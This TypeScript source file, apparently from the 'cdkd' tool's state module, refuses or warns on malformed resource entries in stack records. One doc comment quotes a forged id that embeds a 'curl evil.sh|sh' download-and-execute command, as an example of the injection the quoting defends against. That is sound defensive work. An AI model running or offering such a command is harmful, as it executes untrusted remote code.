/**
 * The ENTRY class (a `resources` row that is not an object or carries no `resourceType`) and the per-entry `attributes` map.
 *
 * Part of `src/state/malformed-resources-bag.ts`, which re-exports every public name here.
 */
import { CdkdError } from '../../utils/error-handler.js';
import { markNonRetryable } from '../../deployment/retryable-errors.js';
import type { LockRecoveryContext } from '../lock-contention-message.js';
import { isReadableBag } from '../../types/state.js';
import type { StackState } from '../../types/state.js';
import {
  STATE_RESOURCES_MALFORMED,
  hasReadableResources,
  displayLogicalId,
  absentIfEmpty,
} from './core.js';
import { stackClause, inspectCommand, inspectClause } from './inspect-command.js';
import { SURVIVOR_THIRD_WAY_OUT, orphanRefusal } from './orphan-refusal.js';
import { malformedStateDiagnosis } from './resources.js';

/**
 * How many unreadable logical ids a message names before summarizing. Read by
 * every builder that names ids — the refusal below, `namedEntriesClause` and
 * `malformedOrphanRecordsWarning` — so "the refusal below" was the count of
 * readers at the time it was written, not a scope.
 *
 * Five rather than the ten the `cdkd export` baseline report uses: this text
 * already carries the remedy command, and that command has to stay on the
 * reader's screen (the reason {@link safeIdentifier} caps a name at all).
 */
export const NAMED_UNREADABLE_ENTRIES = 5;

/**
 * The logical ids of every `resources` ENTRY that is not a readable object.
 *
 * A DIFFERENT shape from the unreadable BAG the rest of this module is about,
 * and one {@link hasReadableResources} says nothing about: it tests the bag, so
 * `{"resources": {"R": null}}` passes it and the `null` surfaces one
 * dereference later (issue go-to-k/cdkd#3018 items 1 and 2). Returns `[]` for an
 * unreadable BAG rather than inventing ids from it — a string bag would
 * otherwise yield one "id" per character. That makes the two refusals
 * ORDER-INDEPENDENT rather than ordered: whichever runs first, an unreadable
 * bag leaves this one silent and is caught by {@link refuseMalformedState}.
 * What a caller must not do is take only this one.
 */
export function unreadableResourceEntries(state: StackState): readonly string[] {
  if (!hasReadableResources(state)) return [];
  return Object.entries(state.resources)
    .filter(([, entry]) => !isReadableResourceEntry(entry))
    .map(([logicalId]) => logicalId);
}

/**
 * Can this ENTRY be read as a resource record at all?
 *
 * Object-ness is NOT the whole question, and taking {@link isReadableBag} for
 * the answer left a shape crashing one line past the guard: `{"R": {}}` is an
 * object, so it passed, and then `resource.resourceType.startsWith(...)` threw
 * — the same bare `TypeError` the `null` entry beside it no longer produces.
 * `resourceType` is the one field every reader of an entry touches before any
 * other (the Custom-Resource routing, the provider lookup, the skip list), so
 * it is the field that decides whether the row can be read at all.
 *
 * Deliberately NOT a widening of {@link isReadableBag}. That predicate answers
 * a question about CONTAINERS — the bag, and the four rendered containers
 * go-to-k/cdkd#3187 added — and a resource-shaped test there would refuse an
 * `outputs` map for having no `resourceType`.
 *
 * It stops at `resourceType` rather than checking `physicalId` or `properties`
 * too, and the message this feeds says only what it checks: a row with a type
 * but no physical id IS readable here, fails per-resource where it is used, and
 * is reported by that command in its own terms.
 */
export function isReadableResourceEntry(entry: unknown): boolean {
  return (
    isReadableBag(entry) && typeof (entry as { resourceType?: unknown }).resourceType === 'string'
  );
}

/**
 * For a command that READS each resource record and WRITES the bag back: refuse
 * the record naming the entries it could not read.
 *
 * **Deliberately NOT folded into {@link refuseMalformedState}**, and the reason
 * is behavioural rather than tidiness: folding it would decide, for every one of
 * that function's callers at once, that ANY unreadable row blocks the whole
 * command — a call none of them has made. `cdkd rollback` is the counter-example
 * that settles it: its executor reaches a record by logical id and treats a
 * falsy one as `skip-already-done`, so an unrelated broken row costs it nothing
 * and refusing would stop the command documented as the way to UNWIND a stack
 * whose state is already suspect. The other callers (`cdkd import`,
 * `cdkd orphan`, `cdkd scrub`) each owe their own classification; `cdkd orphan`
 * answers through its own entry point on this class,
 * {@link refuseMalformedResourceEntriesForOrphan}, scoped to the records its
 * save keeps (go-to-k/cdkd#3350).
 *
 * So the entry rule is OPT-IN, taken by a flow that dereferences EVERY entry and
 * writes the record back.
 *
 * REFUSE rather than skip, at both sites that take it — `cdkd state
 * refresh-observed`, and `cdkd drift` under `--accept` / `--revert` — because
 * each is a WRITER. Skipping would report a clean run (`N refreshed, M
 * unsupported`; `N resources checked`) with the corrupt entries invisible and
 * then save the record back, so the ONE thing the user could have acted on
 * would be the thing the run did not say. Naming them costs nothing a skip
 * would have preserved either: both refusals happen before this stack's lock
 * and before any AWS read of it, so no partial work on it is thrown away.
 *
 * PER STACK, which is why the message says so — and the callers reach a
 * multi-stack refusal differently. `cdkd state refresh-observed` checks every
 * target's shape before it saves any, so a record ALREADY malformed stops the
 * run before a write; only one edited between that check and its own refresh
 * reaches this call after the stacks ahead of it were saved. `cdkd drift --all`
 * collects every stack's report before either writer runs. The message cannot
 * tell which case it is in, so it claims only what holds for both.
 *
 * That is not an argument that a skip is always wrong — the read-only twin
 * {@link repairMalformedResourceEntriesForReadOnly} does exactly that, for
 * plain `cdkd drift` and `cdkd diff`, and warns. What makes the difference is
 * the WRITE, not the shape.
 *
 * Unlike {@link repairMalformedResourcesForReadOnly} this never mutates: the
 * entries stay exactly as stored, which is what keeps the record's own evidence
 * intact for whoever inspects it next.
 */
export function refuseMalformedResourceEntries(
  state: StackState,
  stackName: string,
  region: string,
  /** See {@link malformedResourceEntriesRefusalMessage}. */
  recovery?: LockRecoveryContext
): void {
  const unreadable = unreadableResourceEntries(state);
  if (unreadable.length === 0) return;
  throw new CdkdError(
    malformedResourceEntriesRefusalMessage(stackName, region, unreadable, recovery),
    STATE_RESOURCES_MALFORMED
  );
}

/**
 * For a READ-ONLY command: drop every entry {@link unreadableResourceEntries}
 * names, so the command can report on the rest, and return what it dropped so
 * the caller can warn.
 *
 * The entry-level twin of {@link repairMalformedResourcesForReadOnly}, and it
 * makes the same trade for the same reason: a command that cannot WRITE cannot
 * launder anything, and reporting on the readable resources beats aborting on
 * the first unreadable one. It is a DROP rather than a repair-to-`{}` because
 * there is no empty `ResourceState` that would be honest — a record with no
 * `resourceType` and no `physicalId` names no AWS resource — so the entry leaves
 * the working copy entirely and the caller says so.
 *
 * Call it AFTER {@link repairMalformedResourcesForReadOnly}: an unreadable BAG
 * has no entries to drop, and {@link unreadableResourceEntries} deliberately
 * returns `[]` for one rather than inventing ids from a string's characters.
 *
 * Mutates the in-memory record only. Every caller today renders from the
 * command's own derived output rather than echoing the record back, so the drop
 * is visible as missing ROWS — which is exactly what the warning describes.
 */
export function repairMalformedResourceEntriesForReadOnly(state: StackState): readonly string[] {
  const unreadable = unreadableResourceEntries(state);
  for (const logicalId of unreadable) {
    delete state.resources[logicalId];
  }
  return unreadable;
}

/** The warning a caller of {@link repairMalformedResourceEntriesForReadOnly} emits. */
export function malformedResourceEntriesWarning(
  rawStackName: string,
  rawRegion: string,
  logicalIds: readonly string[],
  /** The caller's account flags, carried on the inspect command (go-to-k/cdkd#4159). */
  recovery?: LockRecoveryContext
): string {
  // {@link absentIfEmpty} at the boundary, then the shared clause and command.
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${namedEntriesClause(stackName, region, logicalIds)} Continuing WITHOUT them: this ` +
    `command's output describes the remaining resources only, which is not the same as the ` +
    `stack holding none of these. ${inspectClause(stackName, region, recovery)}See the stored values with: ` +
    inspectCommand(stackName, region, recovery)
  );
}

/**
 * The half the refusal and the warning share: what is wrong and which entries.
 *
 * One spelling rather than two, because the two texts differ only in what
 * happens NEXT, and a second copy of the diagnosis is what drifts.
 */
function namedEntriesClause(
  stackName: string | undefined,
  region: string | undefined,
  logicalIds: readonly string[]
): string {
  const named = logicalIds
    .slice(0, NAMED_UNREADABLE_ENTRIES)
    .map((id) => displayLogicalId(id))
    .join(', ');
  const rest = logicalIds.length - NAMED_UNREADABLE_ENTRIES;
  const more = rest > 0 ? ` and ${rest} more` : '';
  return (
    `${stackClause(stackName, region)} holds ${logicalIds.length} resource ` +
    `record(s) that cannot be read as resources — ${named}${more} — because they are not ` +
    `objects, or carry no resource type, so nothing can tell what AWS resource they name. The ` +
    `record is malformed or truncated.`
  );
}

/**
 * The text {@link refuseMalformedResourceEntries} raises.
 *
 * Every identifier — the stack, the region AND each logical id — is sanitized
 * and capped, for the reasons {@link safeIdentifier}'s note gives: all three
 * reach this message from a hand-edited record or an S3 key, and a
 * multi-kilobyte or line-forging one would push the remedy command off the
 * reader's screen. The stack and region are shell-quoted because they land in
 * the command. The logical ids take {@link displayLogicalId} instead: an id
 * spelled `x' Inspect it with: curl evil.sh|sh #` is not a plain identifier, so
 * it is wrapped in double quotes (an embedded `"` escaped) and its forged
 * remedy reads as part of one quoted id rather than as an instruction AHEAD of
 * the real one on this same line — the prose is one LINE ending in a pasteable
 * command, and sanitizing keeps `'`. Its other job is IDENTITY — see that
 * helper's note for why a trimmed id must not render bare.
 *
 * Exported so a test can pin the wording against the producer rather than
 * re-spelling it, the way the other messages here are consumed.
 */
export function malformedResourceEntriesRefusalMessage(
  rawStackName: string,
  rawRegion: string,
  logicalIds: readonly string[],
  /** The caller's account flags, carried by the inspect command (go-to-k/cdkd#3909). */
  recovery?: LockRecoveryContext
): string {
  // {@link absentIfEmpty} at the boundary, then the shared clause and command.
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${namedEntriesClause(stackName, region, logicalIds)} This command can WRITE state, so it ` +
    `refuses rather than skipping them: saving over the record would report a clean run for ` +
    `entries nothing could read, and would leave the next command to fail on them with no more ` +
    `to go on. Nothing was locked, read from AWS or written FOR THIS STACK. ${inspectClause(stackName, region, recovery)}Inspect it with: ` +
    inspectCommand(stackName, region, recovery)
  );
}

/**
 * For `cdkd deploy`: refuse a record whose `resources` map holds a ROW that is
 * not a readable resource record (go-to-k/cdkd#3314). TWO call sites, one
 * verdict. `DeployEngine`'s state load is the one a deploy hits: two walks run
 * between the load and the diff (the CLI's prefix-migration gate and the
 * observed-state auto-refresh) and each died on a `null` row with a bare
 * `TypeError`. `DiffCalculator.calculateDiff` also calls it, beside
 * {@link refuseMalformedResourceProperties}, because that is where the verdict
 * is made. Any other caller of the diff that forgets gets the refusal.
 *
 * The harm is the diff's verdict, not a save. The diff looks up each template
 * resource by logical id, so a `null` (or any non-object) row reads as "not in
 * state" and is planned as a CREATE. That either collides with the live
 * resource's name or creates a SECOND copy and orphans the first. A row with no
 * `resourceType` compares unequal to the template's type, so it is planned as a
 * TYPE CHANGE, which is a replacement.
 *
 * A third entry point on the ENTRY class rather than a call to
 * {@link refuseMalformedResourceEntries}, whose text is false here. That text
 * says "Nothing was locked", but the deploy holds its lock at both sites. Same
 * predicate, so the verdict cannot diverge.
 *
 * The engine passes its own resolved stack and region. `calculateDiff` holds no
 * trusted pair and passes neither (see {@link stackClause}).
 */
export function refuseMalformedResourceEntriesForDeploy(
  state: StackState,
  stackName: string | undefined,
  region: string | undefined,
  /** The caller's account flags, carried on the inspect command (go-to-k/cdkd#4159). */
  recovery?: LockRecoveryContext
): void {
  const unreadable = unreadableResourceEntries(state);
  if (unreadable.length === 0) return;
  // `markNonRetryable` for the reason `refuseMalformedResourceProperties`
  // carries it: a nested child's deploy runs inside the parent's `withRetry`.
  throw markNonRetryable(
    new CdkdError(
      malformedDeployResourceEntriesRefusalMessage(stackName, region, unreadable, recovery),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * The text {@link refuseMalformedResourceEntriesForDeploy} raises. Like
 * {@link malformedResourcePropertiesRefusalMessage}, it must be true under
 * `--dry-run` too, since the dry-run return comes after the diff.
 */
export function malformedDeployResourceEntriesRefusalMessage(
  rawStackName: string | undefined,
  rawRegion: string | undefined,
  logicalIds: readonly string[],
  /** The caller's account flags, carried on the inspect command (go-to-k/cdkd#4159). */
  recovery?: LockRecoveryContext
): string {
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${namedEntriesClause(stackName, region, logicalIds)} 'cdkd deploy' can WRITE state and AWS ` +
    `resources, so it refuses rather than continuing — under '--dry-run' too, because the plan ` +
    `a dry run would print is the wrong one: a row that is not an object reads as a resource ` +
    `cdkd does not manage, so the template's resource of that id is planned as a CREATE (a ` +
    `second copy of a live resource, or a name collision), and a row with no resource type is ` +
    `planned as a TYPE CHANGE, which replaces the live resource. Nothing was provisioned and no ` +
    `state was written FOR THIS STACK. Repair or remove the record first; 'cdkd diff' previews ` +
    `the rest of the stack without those rows and warns that it did. ${inspectClause(stackName, region, recovery)}Inspect the record with: ` +
    inspectCommand(stackName, region, recovery)
  );
}

/**
 * For `cdkd destroy` / `cdkd state destroy`: refuse a record whose `resources`
 * map holds a ROW that is not a readable resource record (go-to-k/cdkd#3202).
 *
 * The ENTRY twin of {@link refuseMalformedResourcesForDestroy}, and a fourth
 * entry point on the class rather than a call to
 * {@link refuseMalformedResourceEntries}: that text describes saving a REBUILT
 * map back over the record, and a destroy's saves are the shrinking snapshots
 * of what is left after each delete — its purpose is the delete of what the
 * map names, and then of the record. Same predicate, so the verdict cannot
 * diverge.
 *
 * CALL IT beside the bag guard, above the first read of any row, and again on
 * the record the fast path re-reads under the lock. The runner reads
 * `resource.resourceType` on every row — the "Resources to be deleted" listing
 * above the confirmation prompt, then the template it builds for the
 * dependency graph, the type index behind the implicit delete order, and the
 * delete itself after the lock — and validates none of them. Measured through
 * `runDestroyForStack` with the refusal removed
 * (`tests/unit/cli/destroy-runner-malformed-entries.test.ts`, 2026-09-25): a
 * `null` row throws a bare `TypeError` out of that listing, before the prompt
 * and the lock; a `false`, `0` or `''` row is FALSY at the delete loop's
 * `if (!resource)` guard, warned as `not found in state, skipping`, and the
 * run then removes the record with that row's resource still live and success
 * reported; a string, a list, or an object with no resource type is listed
 * with an empty type — `displaySafe(undefined)` renders `''`, so the row reads
 * `- Bad ()` — then, unless its own `deletionPolicy` takes the retention
 * branch first, ROUTED on `resourceType: undefined` (an object whose type is a
 * NUMBER is routed on the number) and handed to `delete` with a physical id
 * nothing checked — with a stub provider that answers, the run counted the row
 * DELETED, removed the record, and reported success having deleted nothing for
 * it. The real registry's type lookup throws on an undefined type, which the
 * per-resource handler logs as `Failed to delete <row>` with a `TypeError` that
 * says nothing about the record, after every readable row not retained was
 * deleted.
 *
 * `markNonRetryable` for the reason its bag twin carries it: the verdict comes
 * from a persisted record no retry can change, and `NestedStackProvider.delete`
 * reaches this runner inside the parent's `withRetry`.
 */
export function refuseMalformedResourceEntriesForDestroy(
  state: StackState,
  stackName: string,
  region: string,
  /** See {@link malformedDestroyResourceEntriesRefusalMessage}. */
  recovery?: LockRecoveryContext
): void {
  const unreadable = unreadableResourceEntries(state);
  if (unreadable.length === 0) return;
  throw markNonRetryable(
    new CdkdError(
      malformedDestroyResourceEntriesRefusalMessage(stackName, region, unreadable, recovery),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * The text {@link refuseMalformedResourceEntriesForDestroy} raises.
 *
 * Read-only remedy, so it ends ON the inspect command (go-to-k/cdkd#3516). It
 * does NOT offer the `cdkd state orphan` template its bag twin does: that
 * template answers "the whole list is unreadable, and proceeding tears nothing
 * down either", while here every OTHER row is readable and, on every arm but
 * the `null` one, a forced run would delete those resources (the ones no
 * policy retains) around this row — so the honest next step is the repair, not
 * the record's removal.
 */
export function malformedDestroyResourceEntriesRefusalMessage(
  rawStackName: string,
  rawRegion: string,
  logicalIds: readonly string[],
  /** The caller's account flags, carried by the inspect command (go-to-k/cdkd#3909). */
  recovery?: LockRecoveryContext
): string {
  // {@link absentIfEmpty} at the boundary, then the shared clause and command.
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${namedEntriesClause(stackName, region, logicalIds)} 'cdkd destroy' DELETES what this map ` +
    `names, so it refuses rather than continuing: a null row stops the run on a bare TypeError ` +
    `in the listing above the prompt; a false, 0 or empty-string row is SKIPPED as 'not found ` +
    `in state' and the record removed with its resource still live in AWS; and any other row ` +
    `it cannot read, unless its own deletion policy retains it, is routed to a provider on ` +
    `whatever its type field holds — nothing, or a non-string — with a physical id nothing ` +
    `checked, so its delete either fails on a type-lookup error that names the row but not ` +
    `what is wrong with its record, after every readable row not retained was deleted, or is ` +
    `counted done, the record removed and success reported with its resource still live. ` +
    `Nothing was deleted or written FOR THIS STACK. Repair the row first; ` +
    `'cdkd state orphan' drops the whole record with every resource left standing, which is ` +
    `more than this row asks for. ${inspectClause(stackName, region, recovery)}Inspect the record with: ` +
    inspectCommand(stackName, region, recovery)
  );
}

/**
 * For a SELECTIVE `cdkd import`: refuse a record whose `resources` map holds a
 * row that is not a readable resource record AND that this merge does not
 * re-import (go-to-k/cdkd#3202, maintainer review M1).
 *
 * SCOPED like {@link refuseMalformedResourceEntriesForOrphan}: the rows named
 * by `--resource` / `--resource-mapping` are REPLACED by `buildStackState`
 * from the provider's answer, so `cdkd import S --resource Bad=<id> --force`
 * over a `null` `Bad` row is the repair of that row and must not be refused —
 * a record-wide refusal would close a recovery route (go-to-k/cdkd#3159). What
 * a selective merge copies AS IT STANDS is every row it does NOT re-import,
 * and those are the rows this refuses.
 *
 * The shared text holds here: `cdkd import` takes its lock and reads AWS
 * below this call, and the harm it names — saving a record that reports a
 * clean run over rows nothing could read — is exactly the merge's. Whole-stack
 * and `--migrate-from-cloudformation` imports replace the whole map and take
 * no PRE-FLIGHT entry guard; the assembled-map check below still runs for them
 * and passes by construction, since their map starts from `{}` and holds only
 * rows a successful import built.
 *
 * The exemption is a PROMISE the run has yet to keep: a listed row is replaced
 * only when its provider import SUCCEEDS (`buildStackState` skips every other
 * outcome and the merge keeps the stored row), so the ASSEMBLED map is checked
 * again by {@link refuseMalformedResourceEntriesForImportSave} before anything
 * reads a row of it or saves it.
 *
 * NOT `markNonRetryable`: its ONE caller raises from the command body with no
 * `withRetry` around it (the module fence names it under `UNMARKED`).
 */
export function refuseMalformedResourceEntriesForImport(
  state: StackState,
  reimportedLogicalIds: readonly string[],
  stackName: string,
  region: string,
  /** See {@link malformedResourceEntriesRefusalMessage}. */
  recovery?: LockRecoveryContext
): void {
  const reimported = new Set(reimportedLogicalIds);
  const unreadable = unreadableResourceEntries(state).filter((id) => !reimported.has(id));
  if (unreadable.length === 0) return;
  throw new CdkdError(
    malformedResourceEntriesRefusalMessage(stackName, region, unreadable, recovery),
    STATE_RESOURCES_MALFORMED
  );
}

/**
 * For a SELECTIVE `cdkd import`, on the map `buildStackState` ASSEMBLED: refuse
 * if any row is still unreadable (go-to-k/cdkd#3202, Codex review of round 1
 * on go-to-k/cdkd#3758).
 *
 * The pre-flight above exempts the rows the run was asked to re-import, and
 * that exemption holds only for a row whose provider import SUCCEEDED — the
 * merge keeps the stored row for a listed id whose import failed or was
 * skipped, so `--resource Bad=<id>` over a `null` `Bad` that the provider
 * could not import would otherwise save the `null` back (a typeless row) or
 * crash in the property resolution one step later (a `null` one). Every
 * unreadable row left at this point IS such a row — an unlisted one was
 * refused pre-flight — which is what the text says.
 *
 * Own text rather than the shared one: at this point the lock is held and the
 * listed rows' AWS imports have run, so "Nothing was locked, read from AWS"
 * is false, while "nothing was WRITTEN for this stack" still holds — the save
 * is below. NOT `markNonRetryable`, for the reason its pre-flight twin is not.
 */
export function refuseMalformedResourceEntriesForImportSave(
  state: StackState,
  stackName: string,
  region: string,
  /** See {@link malformedImportUnrepairedEntriesRefusalMessage}. */
  recovery?: LockRecoveryContext
): void {
  const unreadable = unreadableResourceEntries(state);
  if (unreadable.length === 0) return;
  throw new CdkdError(
    malformedImportUnrepairedEntriesRefusalMessage(stackName, region, unreadable, recovery),
    STATE_RESOURCES_MALFORMED
  );
}

/**
 * The text {@link refuseMalformedResourceEntriesForImportSave} raises. Read-only
 * remedy, so it ends ON the inspect command (go-to-k/cdkd#3516).
 */
export function malformedImportUnrepairedEntriesRefusalMessage(
  rawStackName: string,
  rawRegion: string,
  logicalIds: readonly string[],
  /** The caller's account flags, carried by the inspect command (go-to-k/cdkd#3909). */
  recovery?: LockRecoveryContext
): string {
  // {@link absentIfEmpty} at the boundary, then the shared clause and command.
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${namedEntriesClause(stackName, region, logicalIds)} 'cdkd import' was asked to re-import ` +
    `these rows and their import did not succeed (each is reported above), so the record it ` +
    `would save still holds them unreadable; it refuses rather than saving a row it could not ` +
    `replace. Nothing was written FOR THIS STACK, and the resources this run did import stay ` +
    `as they are in AWS. Fix what the import reported, or repair the rows by hand, and re-run. ` +
    `${inspectClause(stackName, region, recovery)}Inspect the record with: ` +
    inspectCommand(stackName, region, recovery)
  );
}

/**
 * The text `cdkd scrub` raises on a REAL run over a readable `resources` map
 * holding a row it cannot read (go-to-k/cdkd#3202). Scrub raises its own
 * exit-2 class around it, the way it does around
 * {@link malformedStateRefusalMessage} for the bag, so there is no `refuse*`
 * entry point here — and the SHARED entry text is not borrowed because two of
 * its claims are false at scrub's load: the lock is already held there, and the
 * consequence is not a clean run over a skipped row but a SAVED one.
 *
 * Measured through `scrubStack` with the refusal removed
 * (`tests/unit/cli/commands/scrub-malformed-and-nameless.test.ts`, 2026-09-25),
 * three outcomes by shape and bookkeeping. The rewrite runs only once the
 * STACK recorded any secret at all, and positions every row the template
 * still declares with `Properties`: so a `null` row the template positions
 * throws a bare `TypeError` at `record.properties` under the lock as soon as
 * any resource or output in the stack recorded a secret; with no secret
 * recorded anywhere the run returns before the rewrite and reports the stack
 * CLEAN; a `null` row the template no longer declares is copied into the
 * rebuilt map AS IT STANDS and SAVED when another record changed; and an
 * object with no resource type is rewritten and saved still typeless. A
 * PRIMITIVE the template positions takes a fourth arm, read from the rewrite
 * rather than driven: `{ ...record, properties }` spreads a string into one
 * key per character and a number into nothing, so it is saved back as an
 * object that never was one. Every arm is a WRITER acting on a row it could
 * not read.
 */
export function malformedScrubResourceEntriesRefusalMessage(
  rawStackName: string,
  rawRegion: string,
  logicalIds: readonly string[],
  /** The caller's account flags, carried on the inspect command (go-to-k/cdkd#4159). */
  recovery?: LockRecoveryContext
): string {
  // {@link absentIfEmpty} at the boundary, then the shared clause and command.
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${namedEntriesClause(stackName, region, logicalIds)} 'cdkd scrub' REBUILDS and SAVES the ` +
    `resource map whenever anything in the stack changed, so it refuses rather than continuing: ` +
    `a null row either stops the rewrite on a bare TypeError under the lock (the template still ` +
    `positions it and this stack recorded a secret) or is copied into the rebuilt map as it ` +
    `stands — reported clean when no secret was recorded at all, saved back the moment another ` +
    `record changed; a string or number the template positions is spread into an object and ` +
    `saved as one; and a row with no resource type is rewritten and saved still without one. ` +
    `Nothing was written FOR THIS STACK. Repair or ` +
    `remove the row first; '--dry-run' audits the rest of the record without it and warns ` +
    `that it did. ${inspectClause(stackName, region, recovery)}Inspect the record with: ` +
    inspectCommand(stackName, region, recovery)
  );
}

/**
 * The `resources` twin of {@link malformedLocalOutputsWarning}, for
 * `S3LocalStateProvider.load` (go-to-k/cdkd#3202).
 *
 * A separate text from {@link malformedResourcesWarning} because the
 * consequence differs: that one says "this command's output describes zero
 * resources", and a `cdkd local` run has no such output — what an EMPTY map
 * costs it is every `Ref` / `Fn::GetAtt` in a Lambda's environment resolving
 * to nothing and being dropped, and a bare `--assume-role` falling back to the
 * developer's credentials, each of which the run also does for a record that
 * genuinely holds no resources. Read-only for the reason its `outputs` twin
 * records: `cdkd local` writes no `state.json`.
 */
export function malformedLocalResourcesWarning(
  rawStackName: string,
  rawRegion: string,
  recovery?: LockRecoveryContext
): string {
  // {@link absentIfEmpty} at the boundary, then the shared clause and command.
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${malformedStateDiagnosis(stackName, region)} Continuing with it EMPTY: every 'Ref' and ` +
    `'Fn::GetAtt' in this run's environment that names a resource of this record resolves to ` +
    `nothing and is dropped, and a bare '--assume-role' falls back to the developer's ` +
    `credentials — which is not the same as the record holding no resources. Nothing is ` +
    `written; 'cdkd deploy' and 'cdkd destroy' refuse this record instead. ${inspectClause(stackName, region, recovery)}See the stored ` +
    `value with: ` +
    inspectCommand(stackName, region, recovery)
  );
}

/**
 * The ENTRY half of {@link malformedLocalResourcesWarning}: the rows
 * `repairMalformedResourceEntriesForReadOnly` dropped from the record a
 * `cdkd local` run loads (go-to-k/cdkd#3202).
 *
 * A separate text from {@link malformedResourceEntriesWarning} for the reason
 * the bag twin is separate from its: "this command's output describes the
 * remaining resources only" names an output a local run does not have.
 */
export function malformedLocalResourceEntriesWarning(
  rawStackName: string,
  rawRegion: string,
  logicalIds: readonly string[],
  /** The caller's account flags, carried on the inspect command (go-to-k/cdkd#4159). */
  recovery?: LockRecoveryContext
): string {
  // {@link absentIfEmpty} at the boundary, then the shared clause and command.
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${namedEntriesClause(stackName, region, logicalIds)} Continuing WITHOUT them: a 'Ref' or ` +
    `'Fn::GetAtt' in this run's environment that names one of these ids resolves to nothing and ` +
    `is dropped, and a bare '--assume-role' read through one falls back to the developer's ` +
    `credentials — which is not the same as the record holding no such resource. Nothing is ` +
    `written; 'cdkd deploy' and 'cdkd destroy' refuse this record instead. ${inspectClause(stackName, region, recovery)}See the stored ` +
    `values with: ` +
    inspectCommand(stackName, region, recovery)
  );
}

/*
 * `cdkd orphan`'s guards over what its save KEEPS beyond a survivor's
 * `properties` map (go-to-k/cdkd#3350, go-to-k/cdkd#3345, go-to-k/cdkd#3344).
 *
 * The command rewrites and SAVES the record, so each is a refusal, raised at
 * the load beside {@link refuseMalformedResourcePropertiesForOrphan} and above
 * the `--dry-run` return, for the reasons that one's note records. Each shares
 * that refusal's remedy half through {@link orphanRefusal} and states its own
 * harm, measured through the real `rewriteResourceReferences`.
 *
 * NOT `markNonRetryable`, for the reason that sibling is not: the one caller
 * raises from the command body, with no `withRetry` around it.
 */

/**
 * For `cdkd orphan`: refuse a record whose SURVIVING `resources` entries are
 * not readable resource records (go-to-k/cdkd#3350).
 *
 * The ENTRY class's predicate ({@link unreadableResourceEntries}), scoped to
 * the survivors exactly as the `properties` refusal is: an entry this run
 * DROPS is never saved, and `cdkd orphan` over the damaged record is the way
 * out of it, so the orphan set is subtracted. The drop is safe because the
 * rewriter will not RESOLVE a reference through an unreadable orphaned record —
 * it reports the site as unresolvable instead (`src/analyzer/orphan-rewriter.ts`).
 *
 * A second entry point on the class rather than a widening of
 * {@link refuseMalformedResourceEntries}, whose text says nothing was LOCKED —
 * false here, where the lock is taken before the load — and names no way out.
 */
export function refuseMalformedResourceEntriesForOrphan(
  state: StackState,
  removedLogicalIds: readonly string[],
  stackName: string | undefined,
  region: string | undefined,
  recovery?: LockRecoveryContext
): void {
  const removed = new Set(removedLogicalIds);
  const unreadable = unreadableResourceEntries(state).filter((id) => !removed.has(id));
  if (unreadable.length === 0) return;
  throw new CdkdError(
    malformedOrphanResourceEntriesRefusalMessage(stackName, region, unreadable, recovery),
    STATE_RESOURCES_MALFORMED
  );
}

/**
 * The text {@link refuseMalformedResourceEntriesForOrphan} raises.
 *
 * **This is the one container the save RESHAPES**, so the `properties`
 * refusal's "carried through VERBATIM" must not be borrowed. Measured through
 * the real rewrite, which rebuilds each kept record as
 * `{ ...resource, properties, dependencies }`: `"abcdef"` saved as
 * `{"0":"a",…,"5":"f","dependencies":[]}`, `5` and `true` as
 * `{"dependencies":[]}` (no `physicalId` at all), `[{"Ref":"O"}]` as
 * `{"0":{"Ref":"O"},"dependencies":[]}` with the reference to the orphan left
 * UNREWRITTEN — the failure this command exists to prevent — and `null` threw
 * `Cannot read properties of null`. An object with no `resourceType` is the
 * one shape carried as it stands.
 */
export function malformedOrphanResourceEntriesRefusalMessage(
  rawStackName: string | undefined,
  rawRegion: string | undefined,
  logicalIds: readonly string[],
  recovery?: LockRecoveryContext
): string {
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return orphanRefusal(
    stackName,
    region,
    recovery,
    `${namedEntriesClause(stackName, region, logicalIds)} 'cdkd orphan' REWRITES and SAVES ` +
      `every record it keeps, so it refuses rather than continuing — under '--dry-run' too, so ` +
      `a dry run never prints a plan the real run refuses. The rewrite rebuilds each kept record ` +
      `by copying its fields, and a value that is not an object does not survive the copy: a ` +
      `string or a list is saved as one key per character or element — a list's references to ` +
      `an orphaned resource left UNREWRITTEN — a number or a boolean as a record with no physical ` +
      `id, and null stops the run on a bare TypeError. An object with no resource type is saved ` +
      `as it stands. Continuing would save a record no cdkd command wrote and report success.`,
    SURVIVOR_THIRD_WAY_OUT
  );
}

/**
 * Whether an ENTRY's `attributes` map — the `Fn::GetAtt` cache — can be read.
 *
 * ABSENT IS READABLE: the field is optional on `ResourceState` and plenty of
 * records carry none. `null` is NOT, the split {@link hasReadableOutputs}
 * draws for its own container: the resolver's cached-attribute read gates on
 * `!== undefined` and then indexes the map, so a `null` passes the gate and a
 * string or a list answers for keys it does not hold.
 */
export function hasReadableAttributes(entry: unknown): boolean {
  const attributes = (entry as { attributes?: unknown }).attributes;
  return attributes === undefined || isReadableBag(attributes);
}

/**
 * The logical ids whose `resources` entry carries an `attributes` map that
 * cannot be read (go-to-k/cdkd#3345). Like {@link unreadableResourcePropertyBags}
 * it skips an entry that is not an object — that is the ENTRY class's to name —
 * and returns `[]` for an unreadable bag.
 */
export function unreadableResourceAttributeBags(state: StackState): readonly string[] {
  if (!hasReadableResources(state)) return [];
  return Object.entries(state.resources)
    .filter(([, entry]) => isReadableBag(entry) && !hasReadableAttributes(entry))
    .map(([logicalId]) => logicalId);
}

/**
 * For `cdkd orphan`: refuse a record whose SURVIVING entries carry an
 * unreadable `attributes` map (go-to-k/cdkd#3345). Scoped to the survivors for
 * the reason {@link refuseMalformedResourceEntriesForOrphan} is; an ORPHANED
